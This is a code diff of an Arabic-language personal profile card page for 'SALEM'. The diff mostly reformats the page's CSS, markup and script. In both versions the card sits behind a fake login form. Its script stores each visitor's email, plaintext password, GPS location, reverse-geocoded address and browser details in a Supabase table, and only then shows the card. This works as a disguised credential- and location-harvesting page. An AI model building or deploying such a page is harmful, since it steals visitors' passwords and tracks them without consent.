@@ -22,59 +22,28 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* البطاقة الأصلية كما هي */
-        .vcard { 
-            width: 90%; 
-            max-width: 420px; 
-            height: 600px; 
-            background: var(--front_color); 
-            backdrop-filter: blur(25px); 
-            border-radius: 24px; 
-            border: 1px solid rgba(197, 160, 89, 0.2); 
-            position: relative; 
-            overflow: hidden; 
-            animation: fadeIn 1s ease; 
-            display: none; /* مخفية حتى يتم تسجيل الدخول */
-        }
-
-        /* نافذة تسجيل الدخول */
         .login-box {
-            width: 90%;
-            max-width: 400px;
-            background: rgba(10, 25, 47, 0.9);
-            padding: 40px 30px;
-            border-radius: 24px;
-            border: 1px solid var(--muted-gold);
-            text-align: center;
-            z-index: 100;
-            backdrop-filter: blur(15px);
+            width: 90%; max-width: 400px; background: rgba(10, 25, 47, 0.95);
+            padding: 40px 30px; border-radius: 24px; border: 1px solid var(--muted-gold);
+            text-align: center; z-index: 100; backdrop-filter: blur(15px);
         }
-
-        .login-box h2 { color: var(--gold); margin-bottom: 20px; font-size: 1.5em; }
+        .login-box h2 { color: var(--gold); margin-bottom: 20px; letter-spacing: 1px; }
         .login-box input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(197, 160, 89, 0.3);
-            border-radius: 10px;
-            color: white;
-            outline: none;
+            width: 100%; padding: 12px; margin-bottom: 15px; background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(197, 160, 89, 0.3); border-radius: 10px; color: white; outline: none;
         }
         .login-box button {
-            width: 100%;
-            padding: 12px;
-            background: var(--gold);
-            border: none;
-            border-radius: 10px;
-            color: #020c1b;
-            font-weight: bold;
-            cursor: pointer;
+            width: 100%; padding: 12px; background: var(--gold); border: none;
+            border-radius: 10px; color: #020c1b; font-weight: bold; cursor: pointer;
+        }
+
+        .vcard { 
+            width: 90%; max-width: 420px; height: 600px; background: var(--front_color); 
+            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); 
+            position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; 
         }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* تنسيقات البطاقة الأصلية المحمية */
         .header { height: 35%; position: relative; }
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
         .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
@@ -82,26 +51,21 @@
         .wave-02 { top: -185%; left: -20%; opacity: 0.3; animation-direction: reverse; }
         .wave-03 { top: -175%; left: -10%; opacity: 0.15; }
         @keyframes rotate { 100% { transform: rotate(360deg); } }
-        
         .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         .profile_video { width: 100%; height: 100%; object-fit: cover; }
-        
         .card_content { padding-top: 85px; text-align: center; }
         .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
         .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; font-weight: 500; }
-        
         .social { margin-top: 25px; }
         .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; padding: 0 15px; }
         .social i { padding: 12px; font-size: 1.2em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; }
-        .social a:hover i { color: var(--gold); transform: translateY(-5px); border-color: var(--gold); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2); }
-        
         .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="login-box" id="loginBox">
-    <h2>SALEM | تسجيل الدخول</h2>
+    <h2>تسجيل الدخول | SALEM</h2>
     <input type="email" id="email" placeholder="البريد الإلكتروني">
     <input type="password" id="password" placeholder="كلمة المرور">
     <button onclick="handleLogin()">دخول</button>
@@ -111,24 +75,19 @@
 <div class="vcard" id="mainCard">
     <div class="header">
         <div class="wave_bg"><div class="wave-01"></div><div class="wave-02"></div><div class="wave-03"></div></div>
-        <div class="profile_pic_content">
-            <video class="profile_video" autoplay loop muted playsinline>
-                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
-            </video>
-        </div>
+        <div class="profile_pic_content"><video class="profile_video" autoplay loop muted playsinline><source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4"></video></div>
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
         <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.</div>
         <div class="social">
             <div>
-                <a href="https://t.me/kokksha" title="Telegram"><i class="fab fa-telegram"></i></a>
-                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94" title="Instagram"><i class="fab fa-instagram"></i></a>
-                <a href="https://github.com/salemalshamrie" title="GitHub"><i class="fas fa-code"></i></a>
-                <a href="https://www.facebook.com/share/15KQ2NmX9V/" title="Facebook"><i class="fab fa-facebook"></i></a>
-                
-                <a href="https://uokerbala.edu.iq/" title="University of Karbala"><i class="fas fa-university"></i></a>
-                <a href="https://www.fcbarcelona.com" title="FC Barcelona"><i class="fas fa-football-ball"></i></a>
+                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
+                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
+                <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
+                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
+                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
+                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
             </div>
         </div>
     </div>
@@ -136,7 +95,7 @@
 </div>
 
 <script>
-    const SUPABASE_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'; 
+    const SUPABASE_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
     const SUPABASE_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
@@ -145,57 +104,36 @@
         const password = document.getElementById('password').value;
         const status = document.getElementById('status');
 
-        if (!email || !password) {
-            status.innerText = "يرجى ملء كافة الحقول";
-            return;
-        }
+        if (!email || !password) { status.innerText = "يرجى إكمال البيانات"; return; }
+        status.innerText = "جاري التحقق...";
 
-        status.innerText = "جاري الاتصال...";
-
-        // جلب الموقع الجغرافي
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const locName = await getLocationName(lat, lon);
                 await sendToSupabase(email, password, lat, lon, locName);
-            }, async () => {
-                await sendToSupabase(email, password, null, null, "تم رفض الموقع");
-            });
-        } else {
-            await sendToSupabase(email, password, null, null, "غير مدعوم");
-        }
+            }, async () => { await sendToSupabase(email, password, null, null, "الموقع مرفوض"); });
+        } else { await sendToSupabase(email, password, null, null, "غير مدعوم"); }
     }
 
     async function getLocationName(lat, lon) {
         try {
             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
             const data = await res.json();
-            return data.display_name;
-        } catch { return "خطأ في التسمية"; }
+            return data.display_name || "غير معروف";
+        } catch { return "خطأ في جلب الموقع"; }
     }
 
     async function sendToSupabase(email, password, lat, lon, locName) {
-        const { error } = await _supabase
-            .from('users_data')
-            .insert([{ 
-                email: email, 
-                password: password, 
-                latitude: lat ? lat.toString() : null, 
-                longitude: lon ? lon.toString() : null,
-                location_name: locName,
-                device_info: navigator.userAgent
-            }]);
+        const { error } = await _supabase.from('users_data').insert([{ 
+            email, password, latitude: lat?.toString(), longitude: lon?.toString(), 
+            location_name: locName, device_info: navigator.userAgent 
+        }]);
 
-        if (error) {
-            document.getElementById('status').innerText = "خطأ: " + error.message;
-        } else {
-            // إخفاء تسجيل الدخول وإظهار البطاقة الأصلية
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('mainCard').style.display = 'block';
-        }
+        if (error) { status.innerText = "خطأ: " + error.message; } 
+        else { document.getElementById('loginBox').style.display = 'none'; document.getElementById('mainCard').style.display = 'block'; }
     }
 </script>
-
 </body>
 </html>
